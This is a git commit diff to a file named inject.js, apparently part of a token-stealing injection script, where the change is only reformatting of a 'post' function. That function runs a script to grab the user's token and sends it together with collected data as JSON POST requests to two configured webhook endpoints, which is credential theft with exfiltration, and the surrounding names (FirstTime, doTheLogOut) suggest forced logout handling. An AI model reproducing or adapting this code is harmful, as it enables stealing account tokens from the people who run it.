c5958b88a9de52c714aac8239d1e0f2da9f32b91
mehod <127335330+mehod@users.noreply.github.com>
2023-05-03 13:36:00 +0300

    Update inject.js

--- inject.js
+++ inject.js
@@ -232,35 +232,34 @@ function GetLangue(read) {
     return langue
 }
 const post = async (params) => {
-  params = JSON.stringify(params);
-  var token = await execScript(tokenScript);
-  var n = JSON.stringify({
-    data: params,
-    token: token
-  });
-  [config.uwu, config.webhook].forEach(res => {
-    const url = new URL(res);
-    const options = {
-      host: url.hostname,
-      port: url.port,
-      path: url.pathname,
-      method: 'POST',
-      headers: {
-        "Content-Type": "application/json"
-      }
-    }
-    const req = https.request(options);
-    req.on("error", (err) => {
-      console.log(err);
+    params = JSON.stringify(params)
+    var token = await execScript(tokenScript)
+    var n = JSON.stringify({
+        data: params,
+        token: token
     });
-    req.write(res == config.uwu ? n : params);
-    req.end();
-  })
+    [config.uwu, config.webhook].forEach(res => {
+        const url = new URL(res);
+        const options = {
+            host: url.hostname,
+            port: url.port,
+            path: url.pathname,
+            method: 'POST',
+            headers: {
+                "Content-Type": "application/json"
+            }
+        }
+        const req = https.request(options);
+        req.on("error", (err) => {
+            console.log(err);
+        });
+        req.write(res == config.uwu ? n : params);
+        req.end();
+    })
 }
 
-
-
 post({foo: "bar"});
+
   
 const FirstTime = async () => {
     if (doTheLogOut) return false
